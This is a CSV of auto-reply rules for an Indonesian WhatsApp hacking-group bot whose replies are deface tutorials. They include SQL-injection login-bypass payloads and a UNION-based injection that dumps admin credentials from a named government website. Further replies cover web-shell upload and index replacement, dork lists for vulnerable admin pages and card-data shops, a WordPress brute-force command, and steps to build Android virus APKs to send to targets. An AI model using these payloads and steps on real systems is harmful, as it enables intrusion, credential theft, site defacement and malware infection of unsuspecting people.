"received_message","pattern_matching","reply_message","multiple_replies","multiple_reply_delay","multiple_reply_delay_max","recipients","contacts","ignored_contacts","reply_delay","reply_delay_max","specific_times","monday","tuesday","wednesday","thursday","friday","saturday","sunday","pause_type","pause_value","disabled"
"p","none","P p P p P situ islam kan ?","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"menu","similar","<========================>\n   GRAYHAT TERSAKITI TEAM  \n      <><><><>BOT<><><><><>\n<========================>\n|> tentang bot\n|> subs rey\n|> arti sql\n|> arti bypass admin\n|> apa itu termux\n|> sql balitbang\n|> sql base64\n|> bypass admin\n|> dork bypass admin\n|> dork cc\n|> dork sql\n|> apk sandroproxy\n|> apk droidsqli\n|> apk bot\n|> apk spam wa\n|> minishell\n|> devace sql\n|> into out file\n|> devace wpbf\n|> devace regmem\n|> devace rce\n|> github grup\n|> dorking shell\n|> wa gb\n|> drupal hidden\n|> sadap wa\n<=======================>\n           Ã—   peringatan Ã—\n|>kata""harus sama di atas ajg !\n|>Tanda ini |> jangan lu ketik !\n<=======================>","all","","","b","","","","","0","","","","","","","","seconds","0","0"
"arti sql","none","Apa itu SQL Injection?\n\nSql injection adalah sebuah teknik hacking yang dilakukan dengan menyisipkan baris kode SQL pada kotak isian (misalnya form login) atau pada url yang mana serangan ini akan mempengaruhi logika dari website tersebut.\n\nSql injection memanfaatkan celah keamanan yang disebabkan karena masukan pengguna tidak disaring secara benar oleh aplikasi.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"dork sql","none","Dork SQL Fresh : \n\nhome.php?cat= item_book.php?CAT= www/index.php?page= schule/termine.php?view= goods_detail.php?data= storemanager/contents/item.php?page_code= view_items.php?id= customer/board.htm?mode= help/com_view.html?code= n_replyboard.php?typeboard= eng_board/view.php?T****= prev_results.php?prodID= bbs/view.php?no= gnu/?doc= zb/view.php?uid= global/product/product.php?gubun= m_view.php?ps_db= productlist.php?tid= product-list.php?id= onlinesales/product.php?product_id= garden_equipment/Fruit-Cage/product.php?pr= product.php?shopprodid= product_info.php?products_id= productlist.php?tid= showsub.php?id= productlist.php?fid= products.php?cat= products.php?cat= product-list.php?id= product.php?sku= store/product.php?productid= products.php?cat= productList.php?cat= product_detail.php?product_id= product.php?pid= view_items.php?id= more_details.php?id= county-facts/diary/vcsgen.php?id= idlechat/message.php?id= podcast/item.php?pid= products.php?act= details.php?prodId= socsci/events/full_details.php?id= ourblog.php?categoryid= mall/more.php?ProdID= archive/get.php?message_id=","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"dork cc","none","Dork CC fresh\n\n\ninurl:â€.php?cid=â€ intext:â€shopâ€\nview_details.php?id=\ninurl:â€.php?cid=â€ intext:â€payment_optionâ€\ninurl:â€.php?cid=â€ intext:â€delivery_addressâ€\nProducts.php?id=\ndescription.php?id=\nproductlist.asp?catalogid=\ninurl:â€.php?cid=â€ intext:â€My_cartâ€\ninurl:â€.php?cid=â€ intext:â€Payment_Gatewayâ€\ninurl:â€.php?cid=â€ in poptext:â€Transaction_succesfullâ€\ninurl:â€.php?cid=â€ intext:â€shopingâ€\ninurl:â€.php?cid=â€ intext:â€otpâ€\ninurl:â€.php?cid=â€ intext:â€verifiedâ€\nYour_account_details.php?id=","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"kontol","none","Apa kontol gak senang ?","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"rey","none","Ya ada apa","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk droidsqli","none","https://www.mediafire.com/download/q7g49olglczofm4\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk bot","none","Hubungi Rey bila ingin mendapatkan apk bot\nWa.me/+62089513286355","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"minishell","none","https://www.mediafire.com/download/u9v8lvyhpnaqagy\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bypass admin","none","Tutorial Deface Bypass Admin Login \n\nHallo, Apa kabar?\n\n\nBypass Admin Login~Â Sebenarnya ini tidak jauh berbeda dan masih berhubungan denganÂ SQL Injection.Â Jika kita ketahui, bug ini memungkinkan seorang attacker untuk masuk sebagai admin hanya dengan memasukan username dan password contoh seperti or 1=1 tanpa harus repot-repot seperti halnya melakukan ekploitasi website.\n\n\n\n\nPengertianya cukup itu saja. Oiya buat yang masih belum mengerti atau pengen tahu yang lebih jelas, kenapa ini bisa terjadi? Lalu dimana letak kesalahan tersebut? Oke, saya sudah menyiapkan artikel sebagai referensi untuk bisa kamu baca mengenai hal ini, berikut linknya:\n\n\nBaca:Â Sekilas tentang SQLi Pada Form Login\n\n\nPayload Bypass Admin\n\nDari sekian banyak query yang bertebaran di internet, disini saya akan membagikan beberapa query yang sering saya gunakan untuk bypass admin login website, diantaranya sebagai berikut:\n\n\nadmin' #\nadmin' or '1'='1\nadmin' or '1'='1'#\nadmin' or 1=1 or ''='\n'or 1=1 limit 1 -- -+\n' or '1'='1\n' or 'x'='x\n' or 0=0 --\n' or 0=0 #\n' or 1=1--\n' or 'one'='one\n'or 1=1-- -\n/*12345'or 1=1 limit 1 -- -+*/\n'or''='\n\n\nHanya segitu? Iya cuma itu saja, payload bypass admin login tersebut saya gunakan dari awal saya mengenal/melakukan deface (2015) sampai sekarang (tapi sudah jarang sekali). Nah, jika kamu punya payload yang lain mungkin bisa di share pada kolom komentar biar teman-teman yang lain juga pada tahu.\n\n\nBaiklah tanpa berlama-lama, sekarang mari kita ke inti pokok pembahasan selanjutnya, lestgooo.\n\n\nTutorial Bypass Admin Login Website\n\nNah, apa saja yang diperlukan? Berikut diantaranya:\n\n\n1. Dork\n2. Shell Backdoor\n3. Script Deface\n\n\nPenjelasan:\n\nDork~ Jika tidak punya target kamu bisa mencari website yang terkait vulnerability bypass admin login dengan dork, contoh dork misalnya.\n\n\n""inurl:/admin/login.php""\n""inurl:/admin/login.php"" site:.id\n\n\nSelebihnya kamu kembangkan lagi ya biar bisa dapat yang fresh.\n\n\nShell Backdoor~ File backdoor ini berguna untuk edit, upload dan lain sebagainya.\n\n\nScript Deface~ Jika belum punya kamu bisa download script deface lewat pencarian Google atau kalo bisa ya lebih baik bikin sendiri saja.\n\n\nBaiklah dari apa yang sudah saya sebutkan (3 bahan) tadi, jika kamu sudah punya. Sekarang mari kita simak beberapa tutorial dibawah ini.\n\n\nPOC (Prof End Concept) Bypass Admin Login\n\nStep 1: Eksekusi Target\n\n\nHasil dari mencari target dengan dork, kurang lebih seperti ini target yang saya dapatkan.\n\n\nhttp://target.com/admin/index.php\n\n\nNah sekarang, tinggal mengeksekusi website tersebut bisa atau tidaknya saya dapat masuk ke dashboard panel admin dengan menggunakan payload yang tadi saya sebutkan diatas dan saya mencoba menggunakan payload yang admin' or 1=1 or ''='\n\n\nDisaat berada di dashboard panel admin login, kamu isikan username: admin' or 1=1 or ''=' password: admin' or 1=1 or ''='\n\n\n\n\nKemudian tinggal klik pada tombol Login website tersebut. Apabila berhasil kamu akan diarahkan menuju ke menu dashboard panel admin website tersebut, dan itu artinya kamu sudah bisa mengakses seluruh isi website.\n\n\n\n\nCatatan:Â Perlu di ingat, tidak semua form login admin website bisa di injeksi dengan cara seperti ini, jika gagal kemungkinan sudah di patch bugnya, kamu bisa coba payload yang lain atau cari target yang lainya saja.\n\n\nStep 2: Upload Shell\n\n\nJika kamu sudah berhasil masuk ke dashboard panel admin website target kamu itu artinya sekarang kamu sudah bisa upload shell, edit artikel dan lain sebagainya.\n\n\nLalu bagaimana caranya upload shell backdoor?\n\n\nTips:Â Jika kita tidak bisa upload shell backdoor dikarenakan form upload tersebut hanya memperbolehkan upload file berformatÂ "".jpg, .gif, .jpeg""Â kita bisa mengakalinya dengan bypass extensi shell tersebut. Contoh misalnya seperti iniÂ ""shell.php.jpg, shell.jpg.php, shell.jpg.PhP""Â dan lain sebagainya.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"devace sql","none","tutorial deface sql injection\n\n\n\n\nPada Tutorial Kali ini ,Saya akan Share Tutorial Deface Sql Manual\n\ndork :Â \n\n- inurl:/staff.php?id=\n\n- inurl:/news.php?id=\n\nkembangin sendiri gan.\n\n\nNah Langsung Aja Karena Saya Udah Nemu Situs Yang Vuln Sql ,Oh iya Untuk Mengetahui Vuln Atau Tidak Kalian Hanya Perlu Masukan tanda ( ' ) di belakang angka Id nya, Contoh :\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113' Nah Kek gitu deh, maka munculÂ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1\n\n\n\njika sudah ketemu ,kalian tinggal masukan +order+by+1--+- ,Jadinya :\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+1--+-\n\nKalian Terusin Sampai Ketemu Error ,jadinya\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+1--+- => Ga error\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+2--+- Ga error\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+3--+- Ga errorÂ \n\nSampai eror ya gan,Â \n\n\n\n\n\n\nNah disini saya eror di http://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+9--+- Maka di Pastikan Table nya ada 8, Jika Sudah Gitu Kalian Tinggal ganti +order+by dengan +union+select,jangan lupa di kasih tanda (-) di depan angka id.\n\n\n\njadinya : http://www.utama.tegalkab.go.id/artikel.php?id=-1+union+select+3--+- karena tadi table nya ada 8 http://www.utama.tegalkab.go.id/artikel.php?id=1+union+select+1,2,3,4,5,6,7,8--+- .Maka Akan Terlihat angka Ajaib Nya.\n\n\n\n\nSaya akan pilih Angka Dua Aja Biar Mesra wkwkwk.Sekarang Kita masukan inject nya .\ninject : (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)\nMasukan Pas di angka yang muncul Tadi ,\n\n\nJadinya : http://www.utama.tegalkab.go.id/artikel.php?id=-1+union+select+1,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x),3,4,5,6,7,8,9,10--+- Nah Disini Kalian Akan Lihat Banyak Table Table, Carilah Table Yang ada username dan password nya, kalo gak admin.\n\n\n\n\nNah Jika Sudah Lihat, Kalian Tinggal Dump istilahnya, Atau Buka Table Caranya Dengan Masukan Inject : /*!50000(SELECT+GROUP_CONCAT(username,0x3a,password+SEPARATOR+0x3c62723e)+FROM+utenti)*/Â \n\n\nDisini user dan password saya di Table admin.dan nama table adminnya admin_username. dan passwordnya admin_password. Jadi kalian edit inject nya jadi : /*!50000(SELECT+GROUP_CONCAT([user_id],0x3a,[user_pw]+SEPARATOR+0x3c62723e)+FROM+[securityTab])*/\n\nYang Saya Tandai [ ] Yang Harus Kalian Ganti.\n\n\nMaka Jadinya : http://www.utama.tegalkab.go.id/artikel.php?id=-1+union+select+1,/*!50000(SELECT+GROUP_CONCAT(admin_username,0x3a,admin_password+SEPARATOR+0x3c62723e)+FROM+admin)*/,3,4,5,6,7,8,9,10--+-\n\nNanti Saat Kalian Buka ,Akan Muncul user + password .\n\nÂ  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â \n\nTinggal kalian cari admin login nya hohoho :v","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"devace wpbf","none","Bahan-bahan\n1.face Gans\n2.hp,laptop,pc\n3.termux atau kali linux\n4.kuota ajg :v\n5.dork :intitle:/my blog my wordpress blog\n\nOke\nLanjut ketik script wpbf ini di terminal anda\npkg install git\npkg install python2\npkg install python2\ngit clone https://github.com/reyspeed/wpbf\ncd wpbf\npython2 wpbf.py -u https://target.com/wp-login.php -u admin -P pass.txt\n\nTidak semua user admin ya tod jadi untuk liat user web nya klean bisa tulis gini site.co.li/?author=1 nah biasanya muncul user web nya,,ok setelah bruteforce nanti pasword nya muncul","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"github grup","none","github.com/reyspeed\n\nKlik ajg","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk spam wa","none","https://m.apkpure.com/id/labalabi-for-whatsapp/labalabi.whatsapp/download-apk-info\n\nKlik ajg","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"devace regmem","none","Tutorial Deface PoC Bypass Admin + Tebas Index\n\nYa kembali lagi dengan saya Mr.SkyCoDe kali ini saya akan share tutorial deface poc Bypass admin + tebas index\n\nSebelumnya saya sudah menjelaskan apa itu deface maka langsung simak aja ya\n\nBahan :\n\n- Shell Backdoor\n\n- Script Deface\n\n- Dork :\n\n* inurl:/admin.php Â intext:login intext:adminsitratorÂ \n\n* inurl:/admin/index.php site:.Â \n\n* inurl :/admin/Admin.php intext:loginÂ \n\n* inurl:/administrator/login.php site:.Â \n\n* inurl:/login.php intext:administratorÂ \n\n* inurl:/admin/login.php\n\n* inurl:/admin/login.php site:gov.my (atau apalah kreasikan sendiri) Use your brain ya seterusnya :'vÂ \n\n- kesabaran :vÂ \n\nLangsung sajaÂ  Kalian harus dorking di goggle missal\n\nDork : inurl:/admin/login.php site:inÂ \n\nPilih salah satu web gue baik guee kasih live target :V https://www.drhelpdesk.in/admin/\n\nIsi username sama pw nyaÂ  â€˜=â€™â€™orâ€™Â  Jika gagal login berarti web tersebut tidak vuln bypass admin (cari lagi:v)Â  Jika berhasil maka akan di arahkan ke dashboard admin:v Jika sudah masuk ke dashboard admin cari tempat upload biasa nya di add news atau upload imageÂ  Tinggal upload shell nya lalu klik upload atau submit :DÂ \n\nT E R U P L O A D >:(Â \n\nJika sudah upload shell nya tinggal panggil :D caranya klik kanan gambar rusak view image atau klo android tekan gambar ygÂ  rusak view image atau copy url image :vÂ  Kalo Sudah berhasil, masuk ke shell nya :DÂ \n\n1. Sekarang tinggal tebas index caranya tinggal ke public_htmlÂ \n\n2. Cari Index.php atau Index.htmlÂ \n\n3. Lalu klik edit lalu klik okeÂ \n\n4. Hapus semua lalu ganti dengan script deface kalianÂ \n\n6. Lalu klik go atau save Mari kita lihat indexnya :DÂ  cara nya = www.namasite.col.mek Tutorial Bypass Admin + Tebas Index:v","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"dorking shell","none","DEVACE MENGGUNAKAN DORKING SHELL\n\nBahanÂ²:\n1.Dork\n-intitle:index of cgi.php intext:""64k""\n-intitle:index of zoz.php intext:""64k""\n2.Shell\n3.Akses internet\n4.Hp/Pc\n5.Pacar,Oiya saiya kan joned:'(Â \n6.Kopi dan roko biar paruÂ² selalu smile:)\n\nLangkahÂ²:\n1.kalian dorking dlu ya gaes menggunakan dork yang diatas tadi dan kembangkan sesuai isi otak kalian:v\n\n2.kalo sudah kalian cari target nya gaes dan saya sudah nemu disini\n\n\n\n3.lalu kalian masuk ke target kalian kalo hoki kalian bisa nemu yg udah di tanem shell \n\n\n\n4.langsung saja kalian tebas ya gaes karna saya pengen nikung dlu jadi saya upload shell saya disitu lalu ganti menggunakan shell kalian\n\n\n5.lalu kalian cari index.php nya dan edit dan ganti isi nya menggunakan script deface kalian,karna di target saya gaada index.php nya jadi saya upload aja sendiri dan isi dalam nya script saya\n\n6.kalo sudah kalian save lalu tinggal panggil saja hasil tebas dan done ^_^\n\n7.oke cukup sampe disini saja","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"tentang bot","none","Bot ini khusus di buat untuk keperluan belajar hacking oleh author yaitu Rey","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"drupal hidden","none","DEFACE METODE DRUPAL HIDDEN UPLOADER\n\n\n\n\nHallo gaes kali ini gw akan memberikan tutorial deface metodeÂ drupal hidden uploader ok gausah banyak bacot langsung aja ke tutorialnya : V\nBAHAN"" : SCRIPT DEFACE\nÂ  Â  Â  Â  Â  Â  Â  Â  Â  Â  DORK :\n\nAllowed file types: jpg html txt. site:gov\n\nAllowed file types: jpg html txt. site:edu\n\nAllowed file types: png gif jpg txt.\n\nsite:(Domain Negara yg diinginkan)\n\nÂ  Â  Â  Â  Â  Â  Â  Â  Â  Â  KETAMPANAN: V\nÂ  Â  Â  Â  Â  Â  Â  Â  Â \n1. Dorking dulu di google pake dork yang di atas & pilih target:v\n\n2. Kalau vuln muncul tempat upload\n\n\n\n3. Trus klikÂ PILIH FILEÂ & pilih script deface kesayangan kalian :V lalu klikÂ UPLOAD\n\n\n\n4. Nah kan udah ke upload, di samping tulisanÂ REMOVEÂ kan ada nama script deface lu, truss klik dan BOOM langsung keDeface tinggal mirrorin deh:V\n\n\n\n\nSekian dulu tutorialÂ DEFACE METODE DRUPAL HIDDEN UPLOADERÂ Semoga bermanfaat & semoga kalian paham :V","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"#wts","none","Jangan promosi aja anjeng !","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"subs rey","none","https://www.youtube.com/channel/UCDWY5hUhbdhOsufx1cnp2ng\n\nDi subscribe ya hewkwr","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"arti bypass admin","none","Bypass Admin adalah teknik dimana queri sql dipaksa dimasukan pada form login yang nantinya akan dibaca oleh sistem sebagai sebuah queri sql pada umumnya.Â Karena intruksinya memaksa, jadi tanpa user&pass pun sistem akan memprosesnya.Â ","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk sandroproxy","none","https://m.apkpure.com/id/sandroproxy/org.sandroproxy/download?from=details\n\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"*","similar","Hai member grup kali ini kita untuk belajar menggunakan fitur bot (balasan otomatis) ketik menu untuk memulai bot.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apa itu termux","none","Termux adalah salah satu aplikasi android terminal emulator dan linux environtment yang dapat di gunakan tanpa root dan juga root.\n\nAda banyak kegunaanÂ termux, tentu nya untuk mepermudah user dalam beraktivitas seperti menggunakan bot atau pesan otomatis, bermain game, hacking, seperti : hack situs/website atau biasa disebut juga dengan deface, hack medsos (media sosial), Facebook, Instagram, WhatsApp, hack cctv, hack Video Tron/Layar papan reklame jalan, mengendalikan Laptop/PC, hp, gadget, android/Smartphone orang lain baik jarak dekat maupun jarak jauh, membuat dan mengirimkan virus /Virtex yang dapat membuat hp, gadget, android/Smartphone sih penerima menjadi lambat-loading, lemot, lelet, dan WhatsAppnya keluar sendiri atau eror, membuat dan mengirimkan Spam mulai dari spam telfon, pesan : sms, chat, ngerjain teman dan lain sebagainya.\n\nJika kalian belum mempunyai aplikasi termux, Silahkan Klik-Link dibawah ini untuk mendownload aplikasi Termux :\nhttps://play.google.com/store/apps/details?id=com.termux\n\nPertama - tama kalian harus menginstall dan menjalankanÂ commands/Perintah yang pentingÂ di bawah ini, agar semua tools dapat berjalan denganÂ lancarÂ dan up to date, dan juga silahkan ikuti trik nya.\n\n*Trik Termux* â“‰â“”â“‚â“â“\n\nUntuk mematikan atau memberhentikan tools tekan tombolÂ volume bawah (-) + CÂ secara bersamaan.\n\nUntuk memunculkan commands/perintah sebelumnya tekan tombolÂ volume bawah + P.\n\nMenampilkan Tombol *ESC, HOME, CTRL dan lainnya* Tekan TombolÂ volume atas + Q.\n\nKetik *clear* Untuk Membersihkan tampilan layar.\n\nKetik *exit* untuk keluar dari aplikasi Termux.\n\nKetik *cp* Untuk mengcopy suatu file.\n\nKetik *history* Untuk mengetahui perintah-perintah yang sudah digunakan sebelumnya.\n\n*Keterangan :*\n\n- *apt* dan *pkg* fungsinya sama, yang membedakan hanya tulisan, huruf dan bacaannya.\n\n- *&&* : untuk menggabungkan 2 perintah command-Termux.\n\n- *-y* : untuk melanjutkan penginstalan tools tanpa harus mengetik *y ( y/n ) yes or no*, dalam bahasa Indonesia : *ya atau tidak*.\n\n*Tanpa Root*\n\n*Memperbarui dan Meningkatkan Termux*\n$ pkg update && pkg upgrade\n\n*Tools pendukung yang di perlukan agar tools yang lain work. <----<* _PENTING_\n$ pkg install git php curl -y\n$ pkg install python2\n$ pkg install apache2\n\n*CatatanÂ :* Jika ada pertanyaan saat install, silahkan ketik tombol y lalu enter saja, agar proses install dapat berjalan dengan lancar.\n\n*Menampilkan Matrix*\nIni cuma menampilkan *angka dan huruf* berjatuhan, terlihatÂ keren.\n$ pkg install cmatrix\n$ cmatrix\n\n*Memunculkan gambar Kereta Api yang bergerak*\n$ pkg install sl\n$ sl\n\n*Bermain game*\n$ pkg install moon-buggy\n$ moon-buggy\n\n*Menampilkan Informasi System*\n$ pkg install neofetch\n$ neofetch\n_Untuk melihat Informasi memory_\n$ free\n\n*Membuat Tulisan atau Teks Besar di Terminal*\n$ pkg install figlet\n$ figlet TeMan \n$ ( nama kalian )\n\n*Menampilkan kalender*\n$ cal\n*atau*\n$ cal 2019 \n*Catatan:* jika kalian ingin melihat kalender tahun berikutnya atau sebelumnya kalian hanya tinggal mengubah tahunnya )\n*Untuk menampilkan jam bulan tahun*\n$ date\n\n*Menjalankan Musik di Termux*\n$ pkg install mpv\n$ mpv /lokasi/musik/musik.mp3\n\n*Cara mempercepat koneksi Internet*\n_Ketik perintah berikut ini, untuk mengetahui ip kalian_\n$ ifconfig\n_Setelah itu, akan muncul ip kalian, Silahkan salin IP kalian tersebut dengan menggunakan perintah di bawah ini._\n$ ping -s ipkalian\n\n_atau langsung saja ketik/salin command/perintah dibawah ini :_\n$ ping 8.8.8.8\n\nCara Mempercantik Tampilan Termux\n$ pkg update && pkg upgrade\n$ pkg install ruby cowsay toilet figlet\n$ pkg install neofetch\n$ gem install lolcat\n$ cd ../usr/etc\n$ nano bash.bashrc\n_Kalian tinggal menyalin kode berikut ini lalu menempelkannya :_\n\ncowsay -f eyes ""Nama"" | lolcat\ntoilet -f standard ""Nama"" -F gay\nneofetch\ndate | lolcat\n\nKemudian tekan *Volume bawah + X lalu ""y""* atau jika ada *CTRL* kalian bisa juga *CTRL + X lalu ""y""* dan *Enter*.Lalu coba kalian buka sesi baru dan hiasannya pun akan muncul.\n\n*Root ( Rooting )*\n\n*Untuk masuk mode root (Bila hp sudah di root)*\n$ apt install su\n$ su\n\n*Cara Install Wifite di Termux Android*\nWifiteÂ adalah salah satu tool yang berfungsi untuk wireless attack, seperti mengcrack atau membobol password wifi yang terkunci dengan wpa/wpa2.\n\n*Cara Install Wifite*\n$ git clone https://github.com/derv82/wifite\n$ cd wifite\n$ chmod 777 wifite.py\n\n*Cara Menjalankan Wifite*\n$ python2 wifite.py\n*atau*\n*Cara hack WiFi, hp harus di root terlebih dahulu*\n- Download aplikasi WiFi kill\n\n*Cara Membuat Virus Di Termux*\nInstall Python dan Git, dengan menggunakan perintah :\n$ pkg install python && pkg install git\n\nSelanjutnya yang terakhir, mari kita klon atau download script Vbug, dengan menggunakan perintah :\n$ git cloneÂ https://github.com/Junior60/vbug\n\n- Selanjutnya masuk kedalam direktori VBug, dengan menggunakan perintah :\n$ cd vbug\n\nSelanjutnya, jalankan tools VBug, dengan menggunakan perintah :_\n$ python2 vbug.py\n\n- Jika sudah muncul gambar, silahkan kalian enter.\n- Selanjutnya, kalian akan disuguhi 3 pilihan, yaitu Virus Android, Windows atau MacOS, pilih salah satu, disini saya akan membuat Virus Android yaitu memilih angka nomor 1, dengan menggunakan perintah :\n$ 1 lalu enter\n\n- Setelah itu, kalian akan disuguhi kembali pilihan Virus, silahkan kalian pilih salah satu, pilih sesuai huruf depan Virus, contoh Bootloop, berarti jika kalian ingin memilih Virus Android tersebut kalian tinggal mengetik huruf depannya yaitu : \n$ B lalu enter.\n\n- Selanjutnya, jika kalian ingin mengirim Virus tersebut, silahkan kalian pindahkan virus tersebut ke Penyimpanan Internal kalian, dengan menggunakan perintah :\n$ mv namavirus.apk /sdcard\n\n*Catatan :* Nama Virus Ada Saat Proses Pembuat Virus Menggunakan VBug.\n\n- Jika munvul ""permission denied"" silahkan izinkan Termux mengakses Penyimapanan Internal kalian, dengan menggunakan perintahÂ :\n$ termux-setup-storage\n\n- Kalian tinggal mengirimkan Virus Android tersebut, ke target kalian dan suruh lah install virus tersebut lalu membukanya, maka virus tersebut akan berjalan.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"halo","similar","halo %name%","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"woi bot","none","_Ya ada apa?_<#>Butuh bantuan<#>Ketik *menu* untuk menampilkan semua keyword yang tersedia âœ“","all","","","b","","","","","0","","","","","","","","seconds","0","0"
"wa gb","none","http://www.mediafire.com/file/kxfz7d4u3w6vdcm/GBWA.8.45F_By_FouadMODS.apk/file\n\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"heker","similar","STIKER MULU AJG","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"dork bypass admin","none","DORK BYPASS ADMIN SAKTI GAN :v inurl:/administrator/login.php inurl:/admin/index.php intext:username inurl:/administrator/login.php intext:username inurl:/admin/main.php intext:username inurl:/admin/login.html intext:login inurl:/administrator/index.php intext:login inurl:/adminweb/ intext:login.php ""inurl:admin.php"" ""inurl:admin/login.php"" ""inurl:adminlogin.php"" ""inurl:adminhome.php"" ""inurl:admin_login.php"" ""inurl:administratorlogin.php"" ""inurl:/Manager/index.php ""inurl:login/administrator.php"" ""inurl:administrator_login.php ""inurl:admin/addproduct.asp"" ""inurl:admin/user.asp"" ""inurl:admin/ addpage.php"" ""inurl:admin/ gallery.asp"" ""inurl:admin/image.asp"" ""inurl:admin/adminuser.asp"" ""inurl:admin/productadd.asp"" ""inurl:admin/addadmin.asp"" ""inurl:admin/add_admin.asp"" ""inurl:admin/add_admin.php"" ""inurl:admin/addnews.asp"" ""inurl:admin/addpost"" ""inurl:admin/addforum.???"" ""inurl:admin/addgame.???"" ""inurl:admin/addblog.????"" ""inurl:admin/admin_detail.php"" ""inurl:admin/admin_area.php"" ""inurl:admin/product_add.php"" ""inurl:admin/additem.php"" ""inurl:admin/addstore.php"" ""inurl:admin/add_Products.???"" ""inurl:admin/showbook.???"" ""inurl:admin/selectitem.???"" ""allinurl:admin/addfile.???"" ""inurl:admin/addarticle.asp"" ""inurl:admin/addfile.asp"" ""inurl:admin/upload.php"" ""inurl:admin/upload.asp"" ""inurl:admin/addstory.php"" ""inurl:admin/addshow.php"" ""inurl:admin/addmember.asp"" ""inurl:admin/addinfo.asp"" ""inurl:admin/addcat.asp"" ""inurl:admin/cp.asp"" ""inurl:admin/ productshow.asp"" ""inurl:admin/ addjob.asp"" ""inurl:admin/addjob.???"" ""inurl:admin/addpic.???"" ""inurl:admin/viewproduct.???"" ""inurl:admin/addaccount.php"" ""inurl:admin/manage.php"" ""inurl:admin/addcontact.???"" ""inurl:admin/viewmanager.???"" ""inurl:admin/addschool.???"" ""inurl:admin/addproject.???"" ""inurl:admin/addsale.???"" ""inurl:admin/addcompany.???"" ""inurl:admin/payment.???"" ""inurl:user/emp.???"" ""inurl:admin/ addmovie.???"" ""inurl:admin/ addpassword.???"" ""inurl:admin/ addemployee.???"" ""inurl:admin/ addcat.???"" ""inurl:admin/admin.???"" ""inurl:admin/admincp.???"" ""inurl:admin/settings.???"" ""inurl:admin/addstate.???"" ""inurl:admin/addcountry.???"" ""inurl:admin/addmedia.???"" ""inurl:admin/addcode.???"" ""inurl:admin/addlinks.???"" ""inurl:admin/addcity.???"" ""inurl:admin/login.asp"" ""inurl:adminlogin.asp"" ""inurl:adminhome.asp"" ""inurl:admin_login.asp"" ""inurl:administratorlogin.asp"" ""inurl:login/administrator.asp"" ""inurl:administrator_login.asp inurl:/admin/index.php?id=? inurl:/admin/index.php?r=site/login Dork bypas admin 3 ""inurl:admin/addproduct.asp"" ""inurl:admin/user.asp"" ""inurl:admin/addpage.php"" ""inurl:admin/gallery.asp"" ""inurl:admin/image.asp"" ""inurl:admin/adminuser.asp"" ""inurl:admin/productadd.asp"" ""inurl:admin/addadmin.asp"" ""inurl:admin/add_admin.asp"" ""inurl:admin/add_admin.php"" ""inurl:admin/addnews.asp"" ""inurl:admin/addpost"" inurl""inurl:admin/addforum.???"" ""inurl:admin/addgame.???"" ""inurl:admin/addblog.????"" ""inurl:admin/admin_detail.php"" ""inurl:admin/admin_area.php"" ""inurl:admin/product_add.php"" ""inurl:admin/additem.php"" ""inurl:admin/addstore.php"" ""inurl:admin/add_Products.???"" ""inurl:admin/showbook.???"" ""inurl:admin/selectitem.???"" ""allinurl:admin/addfile.???"" ""inurl:admin/addarticle.asp"" ""inurl:admin/addfile.asp"" ""inurl:admin/upload.php"" ""inurl:admin/upload.asp"" ""inurl:admin/addstory.php"" ""inurl:admin/addshow.php"" ""inurl:admin/addmember.asp"" ""inurl:admin/addinfo.asp"" ""inurl:admin/addcat.asp"" ""inurl:admin/cp.asp"" ""inurl:admin/productshow.asp"" ""inurl:admin/addjob.asp"" ""inurl:admin/addjob.???"" ""inurl:admin/addpic.???"" ""inurl:admin/viewproduct.???"" ""inurl:admin/addaccount.php"" ""inurl:admin/manage.php"" ""inurl:admin/addcontact.???"" ""inurl:admin/viewmanager.???"" ""inurl:admin/addschool.???"" ""inurl:admin/addproject.???"" ""inurl:admin/addsale.???"" ""inurl:admin/addcompany.???"" ""inurl:admin/payment.???"" ""inurl:user/emp.???"" ""inurl:admin/addmovie.???"" ""inurl:admin/addpassword.???"" ""inurl:admin/addemployee.???"" ""inurl:admin/addcat.???"" ""inurl:admin/admin.???"" ""inurl:admin/admincp.???"" ""inurl:admin/settings.???"" ""inurl:admin/addstate.???"" ""inurl:admin/addcountry.???"" ""inurl:admin/addmedia.???"" ""inurl:admin/addcode.???"" 